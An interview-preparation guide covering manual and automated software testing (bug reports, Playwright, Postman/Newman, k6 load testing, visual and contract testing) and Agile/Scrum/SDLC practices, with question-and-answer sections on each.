A good bug report has: a clear title (what fails where), environment (build/version, browser, OS, env URL), preconditions and test data, exact steps to reproduce, expected vs actual result, evidence (screenshot, video, console/network log, request ID or correlation ID), severity and priority. One defect per report; no blame, just facts.

Defect Life Cycle, Severity vs Priority

Typical life cycle: New → Assigned → Open/In Progress → Fixed → Ready for Retest → Retest → Verified → Closed, with side paths Reopened (fix failed), Rejected/Not a Bug, Duplicate, Deferred (fix in a later release) and Cannot Reproduce. Exact states vary by team and Jira workflow.

Severity = technical impact on the system (set mostly by QA). Priority = urgency of fixing it (set by PO/business). They are independent: a misspelled company name on the home page is low severity / high priority; a crash in a rarely used admin report may be high severity / low priority.

The Testing Pyramid

Many fast, cheap unit tests at the base, fewer integration/API/service tests in the middle, and a small number of slow, brittle-prone UI end-to-end tests at the top, with manual exploratory testing on the very top. The anti-pattern is the ice-cream cone: mostly manual and UI tests, slow feedback, flaky pipelines. Push each check to the lowest level that can catch the bug.

Playwright End-to-End Testing

  • Locators — prefer user-facing locators: getByRole, getByLabel, getByText, getByPlaceholder, getByTestId (uses data-testid). Avoid brittle CSS/XPath tied to layout. Locators are lazy and re-resolved on each action.
  • Auto-waiting — actions wait for the element to be attached, visible, stable, enabled and receiving events before acting, so waitForTimeout sleeps are almost never needed.
  • Web-first assertions — await expect(locator).toBeVisible(), toHaveText, toHaveURL, toHaveCount retry until the timeout; expect.soft keeps the test running after a failure.
  • Fixtures — built-ins like page, context, browser, request; each test gets a fresh isolated BrowserContext. Custom fixtures via test.extend (e.g. a logged-in page, a page object). Reuse login with storageState from a setup project.
  • Artifacts — page.screenshot(), plus config options screenshot: 'only-on-failure', video: 'retain-on-failure', trace: 'on-first-retry'; inspect with the Trace Viewer (npx playwright show-trace).
  • Running — headless by default; --headed, --ui (UI mode), --debug, --project=firefox, --grep @smoke. Tests run in parallel workers; npx playwright codegen records starter scripts.
  • API testing too — the request fixture can call REST endpoints for setup or pure API tests, and page.route() mocks network responses.

Playwright in CI

In a pipeline (GitHub Actions, Jenkins, GitLab): npm ci, then npx playwright install --with-deps to fetch browsers and OS libs (or use the official mcr.microsoft.com/playwright Docker image), then npx playwright test. Set retries: 2 and forbidOnly: true when process.env.CI is set, use the webServer config option to start the app before tests, shard large suites with --shard=1/4, and publish the HTML report and traces as build artifacts. Secrets (passwords, tokens) come from CI secret variables, never from the repo.

Postman API Testing and Newman

  • Collections — group requests (folders per resource), shareable and version-controlled as JSON exports.
  • Environments — sets of variables per target (dev, qa, uat) such as {{baseUrl}} and {{token}}, so the same collection runs anywhere.
  • Variable scopes — global, collection, environment, data (from CSV/JSON iteration file) and local; the narrowest scope wins.
  • Pre-request scripts — JavaScript run before a request: generate timestamps, sign requests, fetch an auth token and pm.environment.set('token', …).
  • Post-response (Tests) scripts — assertions with pm.test('status is 200', () => pm.response.to.have.status(200));, pm.expect(pm.response.json().id).to.be.a('number'), response-time checks, schema validation, and chaining by saving an ID for the next request.
  • Newman — the CLI runner: newman run orders.postman_collection.json -e qa.postman_environment.json -d data.csv -r cli,junit. Run it in CI after deployment as an API smoke/regression gate, and publish the JUnit report.

How Developers Support QA

Give testable stories with clear acceptance criteria; deploy builds to a stable QA environment with release notes listing what changed; provide test data (seed scripts, Flyway/Liquibase test data, factory endpoints in non-prod) and test accounts per role; add stable data-testid attributes; expose Swagger/OpenAPI docs and a Postman collection; log with correlation IDs so a bug's request can be traced; and when a bug arrives, first reproduce it from the steps, then add a failing automated test before fixing so it never regresses.

STLC, Test Plan and Traceability Matrix

The Software Testing Life Cycle (STLC) runs alongside the SDLC: requirement analysis (what is testable, clarify ambiguities) → test planning (scope, strategy, effort, risks) → test case design (cases, test data) → environment setup → test execution (run, log defects, retest) → test closure (summary report, metrics, lessons learned). Each phase has entry and exit criteria.

  • Test plan: scope and out of scope, test approach (levels, types, manual vs automated), environments, entry/exit criteria, roles, schedule, risks and mitigations, deliverables.
  • Test strategy: the higher-level, often organisation-wide approach; a test plan applies it to one project or release.
  • Requirements Traceability Matrix (RTM): maps each requirement or user story to its test cases and defects, proving every requirement is covered and showing impact when a requirement changes.
Req IDRequirementTest casesStatusDefects
US-101User can reset password via emailTC-201, TC-202, TC-203Pass-
US-102Account locks after 5 failed loginsTC-210, TC-211FailBUG-77

Performance Testing Basics

Performance testing checks speed, stability and scalability under load. Interviewers expect you to know the types and the key metrics.

  • Load test: expected peak traffic; does it meet the SLA (for example p95 < 500 ms)?
  • Stress test: push beyond capacity to find the breaking point and see how it fails and recovers.
  • Spike test: sudden jump in users (a campaign or a morning login rush).
  • Soak / endurance test: steady load for hours to reveal memory leaks, connection-pool exhaustion and log/disk growth.
  • Metrics: throughput (requests/s), latency percentiles (p50, p95, p99, not just average), error rate, and server-side CPU, memory, GC, DB connections.
  • Tools: JMeter (GUI, mature), k6 and Gatling (tests as code, CI friendly), Locust (Python).
// k6 script (JavaScript): ramp to 50 virtual users, fail the run if p95 > 500 ms
import http from 'k6/http';
import { check } from 'k6';
export const options = {
  stages: [{ duration: '1m', target: 50 }, { duration: '3m', target: 50 }, { duration: '30s', target: 0 }],
  thresholds: { http_req_duration: ['p(95)<500'], http_req_failed: ['rate<0.01'] },
};
export default function () {
  const res = http.get('https://staging.example.com/api/patients?page=0');
  check(res, { 'status is 200': (r) => r.status === 200 });
}

Playwright: Page Object Model and API Testing

The Page Object Model (POM) wraps a page's locators and actions in a class so tests read like user flows and a UI change is fixed in one place. Keep assertions mostly in tests, not page objects. Playwright's built-in request fixture (an APIRequestContext) sends HTTP calls without a browser, which is useful for pure API tests and for fast setup and teardown.

// login.page.ts
export class LoginPage {
  constructor(private page: Page) {}
  async goto() { await this.page.goto('/login'); }
  async login(user: string, pass: string) {
    await this.page.getByLabel('Email').fill(user);
    await this.page.getByLabel('Password').fill(pass);
    await this.page.getByRole('button', { name: 'Sign in' }).click();
  }
}

// patient.spec.ts: create data through the API, verify through the UI
test('new patient appears in list', async ({ page, request }) => {
  const res = await request.post('/api/patients', { data: { name: 'Test Patient' } });
  expect(res.status()).toBe(201);
  await page.goto('/patients');
  await expect(page.getByRole('row', { name: /Test Patient/ })).toBeVisible();
});

Visual, Accessibility and Contract Testing

  • Visual regression: await expect(page).toHaveScreenshot() compares against a stored baseline. Mask dynamic areas (dates, avatars), fix the viewport, and generate baselines on the same OS as CI to avoid font-rendering differences.
  • Accessibility: run axe-core (via @axe-core/playwright) in E2E tests to catch missing labels, contrast and ARIA issues; complement with keyboard-only and screen-reader checks, because automated tools find only part of the problems.
  • Contract testing (for example Pact): the consumer records the requests and responses it relies on; the provider's build verifies it still honours them. It catches breaking API changes between microservices or between Angular and a Spring API without a full end-to-end environment.

Interview Questions — Manual Testing, Playwright & Postman

What is the difference between smoke and sanity testing?

Smoke testing is broad and shallow: run on a new build to decide whether it is stable enough for further testing (app starts, login works, main pages load). Sanity testing is narrow and deep: after a specific bug fix or small change, verify that area works and nothing obvious around it broke. Smoke is often automated and run on every deployment; sanity is often a quick manual check. 💡 Tag a handful of Playwright tests @smoke and run them right after each deploy.

Explain the difference between unit, integration, system and acceptance testing.

Unit tests check one class or method in isolation with dependencies mocked. Integration tests check that components work together — e.g. a Spring service with a real database via Testcontainers. System tests verify the whole deployed application against requirements. Acceptance (UAT) tests are done by business users or the PO to confirm it solves their problem and is ready for release.

What is regression testing and how do you keep it manageable?

Regression testing re-checks existing functionality after a change to make sure nothing that used to work is broken. Keep it manageable by automating stable, high-value paths (unit, API and a small UI suite), running them in CI on every merge, and using risk-based selection for manual regression — focusing on areas touched by the change and critical business flows.

Explain equivalence partitioning and boundary value analysis with an example.

For a quantity field accepting 1–100: equivalence partitioning gives three classes — below range (<1), valid (1–100), above range (>100) — plus invalid formats; you test one representative value from each, e.g. -5, 50, 150, abc. Boundary value analysis then tests the edges where off-by-one bugs live: 0, 1, 2 and 99, 100, 101. Together they give high coverage with few cases.

When would you use a decision table?

When the outcome depends on a combination of conditions — e.g. loan approval depends on credit score, income and existing debt. List each condition as a row, every combination as a column (2ⁿ for n boolean conditions, then collapse impossible or equivalent ones), and the expected action for each. It exposes missing or contradictory business rules and maps directly to test cases or a parameterized JUnit test.

What makes a good bug report?

A specific title, environment and build version, preconditions and test data, numbered reproducible steps, expected vs actual result, and evidence such as screenshots, video, console errors, the failing API request/response or a correlation ID. Add severity, priority and frequency (always vs intermittent). One bug per report, factual tone. 💡 If a developer cannot reproduce it from the report alone, the report is not done.

Severity vs priority — give an example of high severity, low priority and the reverse.

Severity is the technical impact; priority is how soon the business wants it fixed. High severity, low priority: the app crashes when exporting a legacy report format almost nobody uses. Low severity, high priority: the company logo or name is wrong on the landing page right before a launch. Severity is usually set by QA, priority by the Product Owner.

Describe the defect life cycle.

A defect is logged as New, triaged and Assigned, worked on (Open/In Progress), marked Fixed and deployed to QA, then Retested. If it passes it is Verified/Closed; if not it is Reopened. Other outcomes are Rejected (works as designed), Duplicate, Deferred to a later release, or Cannot Reproduce.

What is the testing pyramid and why does it matter?

It recommends many fast unit tests, fewer integration/API tests and only a thin layer of UI end-to-end tests. Lower-level tests are faster, cheaper and pinpoint failures; UI tests are slow and more prone to flakiness. Inverting it (the ice-cream cone) leads to slow pipelines and fragile suites. Test each rule at the lowest level that can catch it, and keep E2E for critical user journeys.

Why Playwright over Selenium?

Playwright has built-in auto-waiting and retrying web-first assertions, which removes most explicit waits and flakiness; it supports Chromium, Firefox and WebKit from one API; each test gets an isolated browser context; and it ships with a test runner, parallelism, tracing, video, codegen and network mocking out of the box. Selenium is mature with a huge ecosystem and many language bindings (including Java), but needs more setup and wait handling. Playwright also has Java, Python and .NET bindings.

Which locators do you prefer in Playwright and why?

User-facing locators: getByRole('button', { name: 'Save' }), getByLabel, getByText, then getByTestId for elements without accessible names. They mirror how users and assistive tech see the page, so they survive CSS and DOM refactors. Avoid long CSS chains and XPath tied to layout. Locators are strict — if one matches several elements an action throws, which catches ambiguous tests early.

How does auto-waiting work, and how do you handle flaky tests?

Before an action, Playwright waits until the element is attached, visible, stable (not animating), enabled and able to receive events; expect assertions keep retrying until they pass or time out. For flakiness: replace fixed sleeps with web-first assertions, wait on a specific network response with page.waitForResponse if needed, isolate test data so tests do not share state, mock unstable third parties with page.route, and use traces (trace: 'on-first-retry') to find the root cause rather than just adding retries.

What are Playwright fixtures? How do you avoid logging in for every test?

Fixtures provide set-up/tear-down resources to tests by name — built-ins are page, context, browser and request, and you add your own with test.extend (e.g. a page object or a seeded user). To skip repeated logins, create a setup project that logs in once and saves context.storageState({ path: 'auth.json' }), then set use: { storageState: 'auth.json' } for dependent projects.

How do you run Playwright tests in CI?

Install dependencies with npm ci, install browsers with npx playwright install --with-deps (or use the official Playwright Docker image), and run npx playwright test, which is headless by default. In config, enable retries and forbidOnly on CI, use webServer to start the app, and capture screenshots/video/traces on failure. Upload the HTML report as a build artifact and shard large suites across machines.

How do you use environments and variables in Postman?

Define variables like {{baseUrl}}, {{token}} in an environment per target (dev, QA, UAT) and reference them in URLs, headers and bodies, so one collection runs everywhere by switching the environment. Scripts set values dynamically: pm.environment.set('orderId', pm.response.json().id) chains requests. Keep secrets in the current (local) value or a vault, not in exported shared files.

What do you put in Postman pre-request and test scripts?

Pre-request: generate dynamic data (timestamps, UUIDs), compute signatures, or call the auth endpoint with pm.sendRequest and store a bearer token. Tests (post-response): assert status codes, response time, headers, body fields and JSON schema using pm.test and pm.expect, and save values for later requests. 💡 Also test negative cases — 400 for bad input, 401/403 for missing or wrong roles, 404 for unknown IDs.

What is Newman and how is it used in a pipeline?

Newman is Postman's command-line collection runner (installed via npm). In CI after deploying to an environment you run newman run collection.json -e qa.json -r cli,junit --reporter-junit-export results.xml; a failing assertion returns a non-zero exit code and fails the build. You can feed a data file with -d for data-driven iterations. The Postman CLI is a newer alternative that integrates with Postman cloud workspaces.

As a developer, how do you help QA be effective?

Write clear acceptance criteria with QA before development, ship builds with release notes describing what changed and what to retest, provide seed data and per-role test accounts, add data-testid hooks and OpenAPI docs, and log with correlation IDs. When a bug comes in, reproduce it, write a failing test, fix it, and describe the fix and impacted areas in the ticket. Treat QA findings as shared ownership of quality, not criticism.

What is the STLC and what are its phases?

The Software Testing Life Cycle is the structured sequence of testing activities: requirement analysis, test planning, test case design, environment setup, test execution and test closure. Each phase has entry and exit criteria, for example execution starts only when the build passes smoke tests and the environment is ready. In Agile these phases happen inside every sprint rather than once per project.

What goes into a test plan?

Scope and out-of-scope items, test approach (levels, types, what is automated), environments and test data, entry and exit criteria, roles and responsibilities, schedule, risks with mitigations, and deliverables (test cases, reports). A test strategy is the broader, reusable approach; the plan applies it to a specific release.

What is a Requirements Traceability Matrix and why use it?

An RTM maps requirements to test cases and to defects. It proves coverage (no requirement without tests), shows which tests to rerun when a requirement changes, and gives a release-readiness view (which requirements still have open defects). In Jira it is often achieved by linking stories to test cases (Xray, Zephyr) instead of a spreadsheet.

Load vs stress vs soak testing?

Load checks behaviour at expected peak traffic against an SLA. Stress goes beyond capacity to find the breaking point and see whether the system fails gracefully and recovers. Soak holds normal load for a long period to expose leaks, pool exhaustion or gradual slowdowns. 💡 Report percentiles (p95/p99), not averages, because averages hide slow outliers.

What is the Page Object Model and what are its pitfalls?

POM puts locators and user actions for a page in a class, so tests are readable and a UI change is fixed in one place. Pitfalls: giant "god" page objects, putting assertions everywhere inside them, and exposing raw locators instead of meaningful actions. In Playwright, combine POM with fixtures so each test receives ready-made page objects.

How do you do API testing with Playwright instead of Postman?

Use the request fixture or request.newContext({ baseURL, extraHTTPHeaders }) to send GET/POST/PUT/DELETE calls and assert on status() and json(). It lives in the same repo and CI run as the UI tests, shares fixtures and auth state, and is handy for seeding data before a UI test. Postman remains better for exploratory API work and sharing collections with non-developers.

What do you check when testing a REST API?
  • Status codes (200/201/204, 400, 401 vs 403, 404, 409, 422, 500).
  • Response schema and data types, required fields, and that sensitive fields are not leaked.
  • Authentication and authorisation (another user's resource returns 403/404).
  • Negative and boundary inputs, validation messages, idempotency of PUT/DELETE, pagination and sorting.
  • Headers (Content-Type, CORS, caching) and response time.
How does visual regression testing work, and why is it flaky?

The tool takes a screenshot and compares it pixel by pixel with an approved baseline, failing above a threshold. Flakiness comes from dynamic content, animations, fonts and anti-aliasing that differ between operating systems. Fix it by masking dynamic regions, disabling animations, using a fixed viewport, and creating baselines inside the same Docker image CI uses.

What is contract testing and when is it better than end-to-end tests?

In consumer-driven contract testing (Pact), the consumer's tests produce a contract of the exact requests and responses it needs, and the provider's pipeline verifies against it. It catches breaking API changes early and quickly, without deploying every service together, so it suits microservices and separately deployed front ends. End-to-end tests are still needed for a few critical journeys.

How do you include accessibility in testing?

Automate the basics with axe-core in Playwright or Lighthouse in CI (labels, alt text, contrast, ARIA roles), and do manual checks: keyboard-only navigation, visible focus, logical tab order and a quick screen-reader pass. Target WCAG 2.1/2.2 AA. Using role-based locators like getByRole also nudges the app toward accessible markup.

Agile, Scrum & SDLC Process

Know how software moves from idea to production: the SDLC phases, why Agile replaced big up-front Waterfall plans, how Scrum (per the 2020 Scrum Guide) organises the work, and the day-to-day practices — stories, estimation, Jira, code review, releases and production support — that interviewers expect you to have lived.

User Story:  ORD-142  Cancel an unshipped order
  As a registered customer
  I want to cancel an order that has not shipped yet
  So that I am not charged for something I no longer need

Acceptance Criteria (Given / When / Then)
  Scenario 1: Cancel before shipment
    Given I am logged in and order #1001 has status "PAID"
    When I click "Cancel order" and confirm
    Then the order status becomes "CANCELLED"
    And a full refund is initiated
    And I receive a cancellation email

  Scenario 2: Cannot cancel after shipment
    Given order #1002 has status "SHIPPED"
    When I view the order
    Then the "Cancel order" button is not shown
    And PATCH /api/orders/1002/cancel returns 409 Conflict

Story points: 5      Sprint: 24      Labels: backend, frontend
Definition of Done: code reviewed & merged, unit + API tests green,
  QA verified on staging, API docs updated, no new critical Sonar issues

SDLC Phases and Waterfall vs Agile

The Software Development Life Cycle phases are: requirements/analysis → design (architecture, DB, UI, APIs) → implementation → testing → deployment → maintenance. Every model goes through these activities; they differ in how they are sequenced.

Waterfall runs the phases once, sequentially, with sign-off gates — predictable and document-heavy, suited to fixed, well-understood, regulated scope, but change is expensive and working software arrives late. Agile runs all phases in short iterations, delivering a usable increment every few weeks, so feedback arrives early and priorities can change cheaply. Other models: V-Model (a test level paired with each design phase), Spiral (risk-driven), and iterative/incremental.

The Agile Manifesto

Four values (2001) — the items on the left are valued more, not exclusively:

  • Individuals and interactions over processes and tools
  • Working software over comprehensive documentation
  • Customer collaboration over contract negotiation
  • Responding to change over following a plan

Backed by 12 principles, e.g. deliver working software frequently, welcome changing requirements, sustainable pace, technical excellence, simplicity (maximising work not done), self-organising teams, and regular reflection to improve.

Scrum: Accountabilities, Events, Artifacts

Scrum (Scrum Guide 2020) is a lightweight framework built on empiricism — transparency, inspection, adaptation — and the values commitment, focus, openness, respect and courage. A Scrum Team is typically 10 or fewer people with three accountabilities:

  • Product Owner — one person accountable for maximising product value; owns and orders the Product Backlog and the Product Goal.
  • Scrum Master — accountable for the team's effectiveness; coaches Scrum, removes impediments, facilitates events as needed. A servant leader, not a project manager.
  • Developers — everyone doing the work of creating the Increment (devs, QA, designers); they own the Sprint Backlog and how the work gets done.

Events: the Sprint (fixed length, one month or less, container for all events), Sprint Planning (why — Sprint Goal; what — selected items; how — plan; max 8h for a month), Daily Scrum (15 min for Developers, inspect progress toward the Sprint Goal), Sprint Review (inspect the Increment with stakeholders and adapt the backlog; a working session, not just a demo) and Sprint Retrospective (improve people, process, tools and the Definition of Done).

Artifacts and their commitments: Product Backlog → Product Goal, Sprint Backlog → Sprint Goal, Increment → Definition of Done. Backlog refinement is an ongoing activity, not a formal event.

User Stories and Acceptance Criteria

Format: As a <role>, I want <capability>, so that <benefit>. Good stories follow INVEST: Independent, Negotiable, Valuable, Estimable, Small (fits in a sprint), Testable. Acceptance criteria define when the story is functionally correct, often in Gherkin Given / When / Then form, which maps directly to automated tests (Cucumber, Playwright, JUnit). Large items are epics, split vertically (thin end-to-end slices through UI, API and DB) rather than horizontally by layer.

Estimation: Story Points and Planning Poker

Story points are a relative measure of effort, complexity and uncertainty — not hours — typically on a modified Fibonacci scale (1, 2, 3, 5, 8, 13, 20…). The team picks a reference story and sizes others relative to it. In planning poker, each developer privately picks a card, all reveal at once, the highest and lowest explain their reasoning, and the team re-votes until it converges — this avoids anchoring and surfaces hidden complexity. Velocity (points completed per sprint, averaged) helps forecast, but it is team-specific and should never be compared across teams or used as a performance target. Alternatives: T-shirt sizing, #NoEstimates/flow metrics.

Definition of Ready and Definition of Done

Definition of Ready (a common team practice, not part of the Scrum Guide): a backlog item is clear enough to pull into a sprint — user story written, acceptance criteria agreed, dependencies identified, designs/API contracts available, estimated, small enough. Definition of Done (mandatory in Scrum): the quality bar for every Increment — e.g. code reviewed and merged, tests written and passing, QA verified, no critical static-analysis issues, docs updated, deployable. Acceptance criteria are per story; the DoD applies to all stories. Work that does not meet the DoD is not part of the Increment and returns to the Product Backlog.

Kanban and WIP Limits

Kanban is a flow-based method: visualise work on a board (To Do → In Progress → Code Review → QA → Done), limit work in progress per column, manage flow, make policies explicit and improve continuously. There are no fixed sprints or prescribed roles; items are pulled when capacity frees up. WIP limits stop the team from starting too much, expose bottlenecks (e.g. a full Code Review column) and reduce context switching — "stop starting, start finishing". Key metrics: lead time, cycle time, throughput, and the cumulative flow diagram. Kanban suits support/ops teams with unpredictable inflow; many teams blend both (Scrumban).

Jira Workflow Basics

Issue types: Epic → Story / Task / Bug → Sub-task. A typical workflow: To Do → In Progress → In Review → QA → Done, plus Blocked. Use the Scrum board for sprints (backlog, sprint planning, burndown chart, velocity report) or the Kanban board for flow. Good habits: keep status current, log blockers immediately, link related issues, reference the ticket key in branch names and commits (feature/ORD-142-cancel-order, ORD-142: add cancel endpoint) so the development panel links branches, PRs and builds, and use JQL filters (assignee = currentUser() AND sprint in openSprints()).

Code Review, Releases, Hotfixes and Production Support

Code review etiquette: keep PRs small and focused with a clear description, linked ticket and test evidence; self-review first; reviewers comment on the code, not the person, explain the why, distinguish blocking issues from nits/suggestions, and respond promptly. Automate style and static checks (Checkstyle, ESLint, Sonar) so humans focus on design, correctness, security and tests.

Release and hotfix: features merge to main/develop behind CI; a release is cut (release branch or tag such as v2.4.0, semantic versioning), deployed dev → QA → staging/UAT → production, with release notes and a rollback plan. Feature flags decouple deploy from release. A hotfix branches from the production tag, gets a minimal fix with a test, a fast review and a targeted regression, is deployed, and is merged back into the main line so the bug does not reappear.

Production support: acknowledge and triage by severity (P1 outage vs P4 cosmetic), communicate status to stakeholders, mitigate first (rollback, feature flag off, scale up, restart), then find the root cause from logs, metrics, traces and correlation IDs. Afterwards run a blameless post-mortem with action items (tests, alerts, runbooks) tracked in the backlog.

Agile Metrics: Velocity, Burndown, Burnup, Cycle Time

MetricWhat it showsWatch out for
VelocityStory points completed per sprint; used for forecastingTeam-specific; never compare teams or use as a performance target
BurndownRemaining work in the sprint over timeHides scope added mid-sprint (line just flattens)
BurnupCompleted work and total scope as two linesMakes scope creep visible; better for releases
Lead timeRequest created → delivered to usersWhat the customer feels
Cycle timeWork started → doneKey Kanban metric; shrink it by limiting WIP
ThroughputItems finished per weekUse with cycle time for forecasting

The DORA metrics measure delivery performance: deployment frequency, lead time for changes, change failure rate and time to restore service. They balance speed with stability.

Backlog Hierarchy, Spikes and Technical Debt

  • Epic → Feature/Story → Sub-task: an epic is a large goal spanning sprints (for example "Patient portal login"); it is split into stories that each deliver value within a sprint. Split vertically (thin slice through UI, API and DB), not by layer.
  • Spike: a time-boxed research task to reduce uncertainty (evaluate a library, prototype an integration) so the real story can be estimated. Output is knowledge or a decision, not production code.
  • Technical debt: shortcuts that make future change slower (missing tests, outdated libraries, duplicated code). Make it visible as backlog items with a business reason, reserve sprint capacity (for example 10–20%), follow the boy-scout rule, and pay it down when touching that code.

Retrospective Formats

  • Start / Stop / Continue and What went well / What didn't / Actions: simple and quick.
  • 4Ls (Liked, Learned, Lacked, Longed for) and Sailboat (wind = helps, anchors = slows, rocks = risks).
  • Good retros are blameless, end with one to three owned, concrete actions, and start by reviewing the previous sprint's actions.

Branching Strategies and Release Techniques

StrategyHow it worksFits
GitFlowdevelop, feature, release and hotfix branches; main holds releasesScheduled, versioned releases
GitHub FlowShort-lived feature branch → PR → main → deployWeb apps with continuous delivery
Trunk-basedVery short branches (hours/day) merged to trunk; unfinished work hidden behind feature flagsHigh-frequency deployment, strong CI
  • CI: every merge builds and runs tests automatically. Continuous Delivery: every green build is releasable (deploy is a button). Continuous Deployment: every green build goes to production automatically.
  • Feature flags: decouple deploy from release; enable per user or percentage and switch off instantly. Remove old flags to avoid flag debt.
  • Blue-green: two identical environments; switch traffic to the new one and switch back for instant rollback.
  • Canary: route a small percentage of traffic to the new version, watch error rates and latency, then increase.
  • Rolling: replace instances a few at a time (the Kubernetes default). Database changes must be backward compatible (expand → migrate → contract).

Interview Questions — Agile, Scrum & SDLC

What are the phases of the SDLC?

Requirements gathering and analysis, design (architecture, data model, APIs, UI), implementation, testing, deployment and maintenance. Waterfall executes them once in sequence; Agile repeats all of them in every short iteration so each sprint produces tested, potentially releasable software.

Waterfall vs Agile — when would you choose each?

Waterfall fits projects with stable, fully known requirements, fixed contracts or heavy regulatory sign-off, where predictability matters more than flexibility. Agile fits products where requirements evolve and early user feedback is valuable; it reduces risk by delivering working increments frequently. Its downside is less up-front predictability of final scope, which is managed through backlog prioritisation and forecasting from velocity.

What are the four values of the Agile Manifesto?

Individuals and interactions over processes and tools; working software over comprehensive documentation; customer collaboration over contract negotiation; responding to change over following a plan. The right-hand items still have value — Agile just values the left-hand items more. 💡 Mention that "working software over documentation" does not mean no documentation.

What are the Scrum roles and what does each do?

The 2020 Scrum Guide calls them accountabilities. The Product Owner maximises value and owns and orders the Product Backlog. The Scrum Master is accountable for team effectiveness — coaching Scrum, removing impediments and serving the team and organisation. The Developers create a usable Increment each sprint and own the Sprint Backlog. There is no separate "team lead" or "QA" role in Scrum; testers are Developers too.

Walk through the Scrum events.

The Sprint is a fixed time-box of one month or less that contains all other events. Sprint Planning sets the Sprint Goal, selects backlog items and plans the work. The Daily Scrum is a 15-minute Developer event to inspect progress toward the Sprint Goal and adapt the plan. The Sprint Review inspects the Increment with stakeholders and adapts the Product Backlog. The Retrospective identifies improvements to process, tools, interactions and the Definition of Done.

Is the Daily Scrum a status meeting with the "three questions"?

Not necessarily. The 2020 Scrum Guide removed the three questions (what I did yesterday, what I'll do today, blockers); Developers may use any structure that focuses on progress toward the Sprint Goal and produces an actionable plan for the next day. It is for the Developers, not a report to a manager, and detailed problem solving happens after it with the relevant people.

What are the Scrum artifacts and their commitments?

Product Backlog — an ordered list of everything needed to improve the product; commitment: the Product Goal. Sprint Backlog — the Sprint Goal, the selected items and the plan to deliver them; commitment: the Sprint Goal. Increment — the sum of usable, done work; commitment: the Definition of Done.

What makes a good user story? Explain INVEST.

A good story delivers user value, is written from the user's perspective and has clear acceptance criteria. INVEST: Independent of other stories where possible, Negotiable (a conversation, not a contract), Valuable to a user or the business, Estimable, Small enough to finish in a sprint, and Testable. Split big stories vertically so each slice is deployable end to end.

How do you write acceptance criteria? What is Given/When/Then?

Acceptance criteria are specific, testable conditions a story must satisfy, agreed by the PO, developers and QA before work starts. Given/When/Then (Gherkin, from BDD) structures each scenario: Given the precondition/context, When an action happens, Then the expected outcome. Include negative and edge cases. They translate directly into automated API or UI tests.

What are story points and why not estimate in hours?

Story points are a relative measure combining effort, complexity and uncertainty. Relative sizing ("this is about twice that one") is faster and more consistent than absolute hour estimates, works regardless of who picks up the task, and naturally accounts for risk. Velocity then converts points to a sprint forecast. Points should not be converted back into hours or used to compare individuals or teams.

How does planning poker work?

The PO explains a story, each estimator privately chooses a Fibonacci card, and everyone reveals simultaneously. If estimates differ widely, the highest and lowest voters explain their reasoning — often revealing missed complexity or a simpler approach — and the team re-votes until it converges. Simultaneous reveal prevents anchoring on the most senior person's number.

Definition of Ready vs Definition of Done vs acceptance criteria?

Definition of Ready is an optional team agreement on when a backlog item is clear enough to start (criteria written, dependencies known, estimated). Definition of Done is required in Scrum and is the shared quality standard for every Increment (reviewed, tested, merged, deployable, documented). Acceptance criteria are story-specific functional conditions. A story is done only when it meets both its acceptance criteria and the DoD.

What is Kanban and what are WIP limits for?

Kanban is a flow-based method that visualises work on a board, limits work in progress, and optimises flow without fixed iterations. WIP limits cap how many items can be in a column at once; when a column is full, the team helps finish work downstream instead of starting new work. This shortens cycle time, exposes bottlenecks such as slow code reviews, and reduces context switching.

Scrum vs Kanban — how do they differ?

Scrum uses fixed-length sprints, defined accountabilities, events and a sprint commitment; changes usually wait for the next sprint. Kanban has continuous flow, no prescribed roles or iterations, and items can be reprioritised at any time, governed by WIP limits.
